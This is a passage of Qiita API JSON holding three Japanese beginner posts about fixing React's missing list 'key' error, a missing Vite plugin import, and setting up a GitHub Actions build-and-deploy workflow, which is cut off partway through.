class=\"bold\">App.jsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n　　　ー省略ー\n    　<span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">table</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">thead</span><span class=\"p\">&gt;&lt;/</span><span class=\"nt\">thead</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">tbody</span><span class=\"p\">&gt;</span>\n          <span class=\"si\">{</span><span class=\"nx\">records</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">((</span><span class=\"nx\">record</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n<span class=\"hdl\"><span class=\"o\">- </span>           <span class=\"o\">&lt;</span><span class=\"nx\">tr</span><span class=\"o\">&gt;</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>           <span class=\"o\">&lt;</span><span class=\"nx\">tr</span> <span class=\"nx\">key</span><span class=\"o\">=</span><span class=\"p\">{</span><span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">}</span><span class=\"o\">&gt;</span>\n</span>              <span class=\"p\">&lt;</span><span class=\"nt\">td</span><span class=\"p\">&gt;</span>\n                <span class=\"si\">{</span><span class=\"s2\">`</span><span class=\"p\">${</span><span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"p\">}</span><span class=\"s2\"> </span><span class=\"p\">${</span><span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">}</span><span class=\"s2\">時間`</span><span class=\"si\">}</span>\n              <span class=\"p\">&lt;/</span><span class=\"nt\">td</span><span class=\"p\">&gt;</span>\n              <span class=\"p\">&lt;</span><span class=\"nt\">td</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;</span><span class=\"nt\">button</span> <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">onClickDelete</span><span class=\"p\">(</span><span class=\"nx\">record</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>削除<span class=\"p\">&lt;/</span><span class=\"nt\">button</span><span class=\"p\">&gt;</span>\n              <span class=\"p\">&lt;/</span><span class=\"nt\">td</span><span class=\"p\">&gt;</span>\n            <span class=\"p\">&lt;</span><span class=\"err\">/</span><span class=\"na\">tr</span><span class=\"p\">&gt;</span>\n          )}\n        <span class=\"p\">&lt;/</span><span class=\"nt\">tbody</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"err\">/</span><span class=\"na\">table</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">button</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"add\"</span> <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">onClickAdd</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>登録<span class=\"p\">&lt;/</span><span class=\"nt\">button</span><span class=\"p\">&gt;</span>\n      <span class=\"si\">{</span><span class=\"nx\">error</span><span class=\"si\">}</span><span class=\"p\">&lt;</span><span class=\"nt\">br</span> <span class=\"p\">/&gt;</span>\n      合計時間:<span class=\"si\">{</span><span class=\"nx\">totalTime</span><span class=\"si\">}</span> / 1000(h)  \n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"si\">}</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  )\n}\n\nexport default App\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"53:1-53:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"54:1-54:108\">エラーに出会うことで、改めて基本事項をおさらいできるのはありがたいです。</p>\n<h1 data-sourcepos=\"56:1-56:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"58:1-58:89\"><iframe id=\"qiita-embed-content__a23f4de7795d1430b3aabe2526f1a872\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a23f4de7795d1430b3aabe2526f1a872\" data-content=\"https%3A%2F%2Fwww.udemy.com%2Fcourse%2Fmodern_javascipt_react_beginner%2Flearn%2Flecture%2F40838780%23notes\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"60:1-60:76\"><iframe id=\"qiita-embed-content__2d5b9ebf5a60719261fe926484761637\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2d5b9ebf5a60719261fe926484761637\" data-content=\"https%3A%2F%2Freact.dev%2Flearn%2Frendering-lists%23keeping-list-items-in-order-with-key\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nテストコード作成時、表題のエラーが発生しました。動画で学んだなと思いつつ、忘れていたため記事にします。\n\n# 問題\nテストコード作成時、テーブル最後の行を取得するように試みたところ、「Each child in a list should have a unique \"key\" prop.」のエラーが発生\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ded3cffd-e29d-4981-855d-e499d9063d14.png)\n\n# 解決方法\nmapでループして一行ずつレンダリングしている trタグに一意となるkeyを設定する。\n\n※参考動画、ドキュメントより引用\n> reactの裏側で動いている仮想DOMの仕組みは、変更前と変更後の差分のみを抽出している。\nループでレンダリングした際に何個目の要素なのかを正確に比較するため、一意となる値の目印をつけてあげる必要がある。\n\n> indexの使用も可だが、非推奨\n>>　アイテムが挿入されたり削除されたり、配列の順序が入れ替わったり、アイテムのレンダリング順序は時間の経過とともに変化します。インデックスをキーに指定すると、微妙なバグや混乱を招くことがよくあります。\n\n\n```diff_jsx:App.jsx\nreturn (\n    <>\n　　　ー省略ー\n    　<div>\n      <table>\n        <thead></thead>\n        <tbody>\n          {records.map((record) =>\n-            <tr>\n+            <tr key={record.id}>\n              <td>\n                {`${record.title} ${record.time}時間`}\n              </td>\n              <td>\n                <button onClick={() => onClickDelete(record.id)}>削除</button>\n              </td>\n            </tr>\n          )}\n        </tbody>\n      </table>\n      <button data-testid=\"add\" onClick={onClickAdd}>登録</button>\n      {error}<br />\n      合計時間:{totalTime} / 1000(h)  \n      </div>\n      }\n    </>\n  )\n}\n\nexport default App\n```\n\n# おわりに\nエラーに出会うことで、改めて基本事項をおさらいできるのはありがたいです。\n\n# 参考\n\nhttps://www.udemy.com/course/modern_javascipt_react_beginner/learn/lecture/40838780#notes\n\nhttps://react.dev/learn/rendering-lists#keeping-list-items-in-order-with-key\n","coediting":false,"comments_count":0,"created_at":"2025-03-02T20:28:56+09:00","group":null,"id":"d0c4f86fe027640e3cda","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"初心者","versions":[]},{"name":"React","versions":[]}],"title":"【React】Each child in a list should have a unique \"key\" prop.が発生する","updated_at":"2025-03-02T20:28:56+09:00","url":"https://qiita.com/asa129/items/d0c4f86fe027640e3cda","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":588,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:160\">process.envで環境変数を読み込めるようにvite.config.jsを修正したところエラーになったので、戒めをこめて記事にします。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:167\">process.envで環境変数を読み込めるようにvite.config.jsを修正したところReferenceError: env is not definedエラーとなりビルドできない。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"7:1-17:3\">\n<div class=\"code-lang\"><span class=\"bold\">vite.config.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">defineConfig</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">vite</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"nx\">react</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@vitejs/plugin-react</span><span class=\"dl\">'</span>\n\n<span class=\"c1\">// https://vite.dev/config/</span>\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nf\">defineConfig</span><span class=\"p\">({</span>\n  <span class=\"na\">plugins</span><span class=\"p\">:</span> <span class=\"p\">[</span><span class=\"nf\">react</span><span class=\"p\">(),</span>\n\t\t<span class=\"nf\">env</span><span class=\"p\">({</span> <span class=\"na\">prefix</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">VITE</span><span class=\"dl\">\"</span><span class=\"p\">,</span>  <span class=\"na\">mountedPath</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">process.env</span><span class=\"dl\">\"</span> <span class=\"p\">})</span> \n\t<span class=\"p\">]</span>\n<span class=\"p\">})</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"19:1-19:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"20:1-20:62\">vite-plugin-env-compatibleをimportできていなかった。</p>\n<div class=\"code-frame\" data-lang=\"diff_javascript\" data-sourcepos=\"22:1-33:3\">\n<div class=\"code-lang\"><span class=\"bold\">vite.config.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">defineConfig</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">vite</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"nx\">react</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@vitejs/plugin-react</span><span class=\"dl\">'</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">import</span> <span class=\"nx\">env</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">vite-plugin-env-compatible</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span>\n<span class=\"c1\">// https://vite.dev/config/</span>\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nf\">defineConfig</span><span class=\"p\">({</span>\n  <span class=\"na\">plugins</span><span class=\"p\">:</span> <span class=\"p\">[</span><span class=\"nf\">react</span><span class=\"p\">(),</span>\n\t\t<span class=\"nf\">env</span><span class=\"p\">({</span> <span class=\"na\">prefix</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">VITE</span><span class=\"dl\">\"</span><span class=\"p\">,</span>  <span class=\"na\">mountedPath</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">process.env</span><span class=\"dl\">\"</span> <span class=\"p\">})</span> \n\t<span class=\"p\">]</span>\n<span class=\"p\">})</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"34:1-34:90\">ライブラリのインストールもできていなかったため、インストール</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"35:1-37:3\"><div class=\"highlight\"><pre><code>$ npm i --save-dev vite-plugin-env-compatible\n</code></pre></div></div>\n<h1 data-sourcepos=\"39:1-39:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"40:1-40:78\">importを忘れるという、ちょっと恥ずかしいエラーでした。</p>\n<h1 data-sourcepos=\"42:1-42:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"44:1-44:56\"><iframe id=\"qiita-embed-content__4848ba021799a8cd51bfc30f83f00446\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4848ba021799a8cd51bfc30f83f00446\" data-content=\"https%3A%2F%2Fqiita.com%2FSicut_study%2Fitems%2Fd48bec20fa8b082a2368\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nprocess.envで環境変数を読み込めるようにvite.config.jsを修正したところエラーになったので、戒めをこめて記事にします。\n\n# 問題\nprocess.envで環境変数を読み込めるようにvite.config.jsを修正したところReferenceError: env is not definedエラーとなりビルドできない。\n\n```javascript:vite.config.js\nimport { defineConfig } from 'vite'\nimport react from '@vitejs/plugin-react'\n\n// https://vite.dev/config/\nexport default defineConfig({\n  plugins: [react(),\n\t\tenv({ prefix: \"VITE\",  mountedPath: \"process.env\" }) \n\t]\n})\n```\n\n# 解決方法\nvite-plugin-env-compatibleをimportできていなかった。\n\n```diff_javascript:vite.config.js\nimport { defineConfig } from 'vite'\nimport react from '@vitejs/plugin-react'\n+ import env from \"vite-plugin-env-compatible\";\n\n// https://vite.dev/config/\nexport default defineConfig({\n  plugins: [react(),\n\t\tenv({ prefix: \"VITE\",  mountedPath: \"process.env\" }) \n\t]\n})\n```\nライブラリのインストールもできていなかったため、インストール\n```\n$ npm i --save-dev vite-plugin-env-compatible\n```\n\n# おわりに\nimportを忘れるという、ちょっと恥ずかしいエラーでした。\n\n# 参考\n\nhttps://qiita.com/Sicut_study/items/d48bec20fa8b082a2368\n","coediting":false,"comments_count":0,"created_at":"2025-02-28T22:37:43+09:00","group":null,"id":"038745a48d1ed66b4e41","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"vite","versions":[]}],"title":"【Vite】npm run buildするとReferenceError: env is not definedエラーが出る","updated_at":"2025-02-28T22:37:43+09:00","url":"https://qiita.com/asa129/items/038745a48d1ed66b4e41","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":452,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:102\">GithubActionsで自動デプロイ(cd)することに三連休を費やしました。<br>\n非常に時間がかかってしまったので、今後のためにプロセスをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:23\">\n<span id=\"実現したいこと\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E3%81%97%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>実現したいこと</h1>\n<p data-sourcepos=\"6:1-6:98\">GithubActionsを用いて、プロジェクトをpush時にビルドとデプロイまで行う。</p>\n<h1 data-sourcepos=\"8:1-8:17\">\n<span id=\"行ったこと\" class=\"fragment\"></span><a href=\"#%E8%A1%8C%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>行ったこと</h1>\n<h3 data-sourcepos=\"9:1-9:28\">\n<span id=\"1githubactionsの理解\" class=\"fragment\"></span><a href=\"#1githubactions%E3%81%AE%E7%90%86%E8%A7%A3\"><i class=\"fa fa-link\"></i></a>1.GithubActionsの理解</h3>\n<p data-sourcepos=\"10:1-10:63\">こちらの記事を参考に使い方を把握しました。</p>\n<p data-sourcepos=\"12:1-12:50\"><iframe id=\"qiita-embed-content__af4712587fcf2ff036c77fddfc81c87e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__af4712587fcf2ff036c77fddfc81c87e\" data-content=\"https%3A%2F%2Fqiita.com%2FTeach%2Fitems%2Fd2c4d7bec98228df1807\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"14:1-14:47\">\n<span id=\"ここでの疑問１ymlとは何\" class=\"fragment\"></span><a href=\"#%E3%81%93%E3%81%93%E3%81%A7%E3%81%AE%E7%96%91%E5%95%8F%EF%BC%91yml%E3%81%A8%E3%81%AF%E4%BD%95\"><i class=\"fa fa-link\"></i></a>ここでの疑問１「ymlとは何？」</h4>\n<p data-sourcepos=\"16:1-16:37\"><iframe id=\"qiita-embed-content__f483e5cb854994caeb77f24a939833ab\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f483e5cb854994caeb77f24a939833ab\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword13803.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"18:1-18:37\"><iframe id=\"qiita-embed-content__65c0e1fffa605a51c33b1488ea1d0963\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__65c0e1fffa605a51c33b1488ea1d0963\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword13801.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"20:1-20:27\">上記サイトより引用</p>\n<blockquote data-sourcepos=\"21:1-22:114\">\n<p data-sourcepos=\"21:2-21:77\">YAMLのルールに従って書かれた、テキストファイルのこと</p>\n<blockquote data-sourcepos=\"22:2-22:114\">\n<p data-sourcepos=\"22:4-22:114\">構造化されたデータを表現するのに便利な、ファイルの書き方ルール（のひとつ）</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"24:1-25:114\">ヤムルと読むそう<br>\nXMLなどの類のひとつ、データのやりとりに使われる書き方のひとつと理解しました。</p>\n<h4 data-sourcepos=\"27:1-27:70\">\n<span id=\"ここでの疑問2ymlに記載の内容がわからない\" class=\"fragment\"></span><a href=\"#%E3%81%93%E3%81%93%E3%81%A7%E3%81%AE%E7%96%91%E5%95%8F2yml%E3%81%AB%E8%A8%98%E8%BC%89%E3%81%AE%E5%86%85%E5%AE%B9%E3%81%8C%E3%82%8F%E3%81%8B%E3%82%89%E3%81%AA%E3%81%84\"><i class=\"fa fa-link\"></i></a>ここでの疑問2「.ymlに記載の内容がわからない」</h4>\n<p data-sourcepos=\"29:1-29:101\">「GitHub Actions　リファレンス」で検索するとドキュメントがでてきました。</p>\n<p data-sourcepos=\"31:1-31:92\"><iframe id=\"qiita-embed-content__b26142aae1a02dcdd1e74ca72efda14f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__b26142aae1a02dcdd1e74ca72efda14f\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fworkflow-syntax-for-github-actions%23name\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"33:1-33:84\">各構文を検索すると具体例とともに説明が記載されています。</p>\n<h3 data-sourcepos=\"35:1-35:51\">\n<span id=\"2githubactionsでbuildできるようにする\" class=\"fragment\"></span><a href=\"#2githubactions%E3%81%A7build%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2.GithubActionsでbuildできるようにする</h3>\n<p data-sourcepos=\"36:1-36:103\">1.で学んだことを元に、CDしたいプロジェクトにymlファイルを作成しました。</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"38:1-49:3\">\n<div class=\"code-lang\"><span class=\"bold\">release.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Release</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">workflow_dispatch</span><span class=\"pi\">:</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">project_build</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm run build</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"51:1-52:122\">結果はエラー<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1a4082f6-d5e5-4e3b-81c7-b8f5f9fa1261.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=675faaed3b68df17f23ac287448949c9\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1a4082f6-d5e5-4e3b-81c7-b8f5f9fa1261.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=675faaed3b68df17f23ac287448949c9\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1a4082f6-d5e5-4e3b-81c7-b8f5f9fa1261.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=51c93bbcd53713f664e8ddf720c02e0a 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1a4082f6-d5e5-4e3b-81c7-b8f5f9fa1261.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"54:1-54:27\">こちらを参考に修正</p>\n<p data-sourcepos=\"56:1-56:89\"><iframe id=\"qiita-embed-content__6613b0f8aa9f1c919ad727cbc44790c5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__6613b0f8aa9f1c919ad727cbc44790c5\" data-content=\"https%3A%2F%2Fzenn.dev%2Fjinwatanabe%2Farticles%2F4026d373383739%23%25E3%2581%25AF%25E3%2581%2598%25E3%2582%2581%25E3%2581%25AB\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"58:1-78:3\">\n<div class=\"code-lang\"><span class=\"bold\">release.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Release</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">workflow_dispatch</span><span class=\"pi\">:</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">project_build</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v2</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">18\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm install</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run build</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm run build</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"80:1-81:75\">ワークフローがリポジトリにアクセスできるよう、チェックアウトを行う。<br>\nnpmコマンドを使用できるようにする必要がありました。</p>\n<h3 data-sourcepos=\"83:1-83:52\">\n<span id=\"3githubactionsでdeployできるようにする\" class=\"fragment\"></span><a href=\"#3githubactions%E3%81%A7deploy%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>3.GithubActionsでdeployできるようにする</h3>\n<p data-sourcepos=\"84:1-84:76\">2.で参考にした記事ではfirebase-toolsを使用していました。</p>\n<p data-sourcepos=\"87:1-87:98\"><iframe id=\"qiita-embed-content__deca17be1f061d6ae65111a2869b0d28\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__deca17be1f061d6ae65111a2869b0d28\" data-content=\"https%3A%2F%2Fzenn.dev%2Fjinwatanabe%2Farticles%2F4026d373383739%233.-github-actions-%25E3%2581%25AE%25E8%25A8%25AD%25E5%25AE%259A\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"89:1-90:81\">firebase-tools、upload-artifactを使用して、build⇒deployをするように追記しました。<br>\nまた、push時にデプロイされるようにon: pushに修正しました。</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"92:1-139:3\">\n<div class=\"code-lang\"><span class=\"bold\">release.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Release</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span> <span class=\"s\">push</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">project_build</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v4</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">18\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm install</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run build</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm run build</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Archive Production Artifact</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/upload-artifact@main</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n          <span class=\"na\">path</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n\n  <span class=\"na\">project_deploy</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">needs</span><span class=\"pi\">:</span> <span class=\"s\">project_build</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span 